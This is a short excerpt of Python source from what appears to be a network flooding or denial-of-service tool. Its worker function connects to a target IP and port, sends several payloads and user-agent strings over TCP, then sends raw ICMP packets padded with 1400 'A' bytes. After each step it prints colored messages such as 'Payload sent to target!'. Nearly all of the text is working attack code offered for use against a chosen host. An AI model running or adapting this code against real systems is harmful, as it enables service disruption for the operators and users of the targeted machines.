...
def worker(ip, port, combined_str, request, sendbutton, payload):
    ...
    try:
        ...
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Requests sent successfully")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((ip, port))
        s.send(combined_str.encode("utf-8"))
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Special Payload successfully sent")
        s.send(sendbutton.encode('utf-8'))
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Different Payload successfully sent")
        s.send(payload.encode('utf-8'))
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Payload successfully sent")
        s.send(random_user_agent.encode('utf-8'))  
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"User Agents sent successfully")
        icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        payload = bytes("A" * 1400, "utf-8")
        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Fuzzer Payload successfully sent")
        icmp_packet = create_icmp_echo_request(os.getpid() & 0xFFFF, 1, len(payload))
        icmp_sock.sendto(icmp_packet, (ip, port))
        icmp_sock.close()
        print(bccolar.GREEN + ip + ":" + bccolar.YELLOW + str(port) + bccolar.RED + " [+]" + bccolar.YELLOW + " Payload sent to target!")
        successful_requests += 1
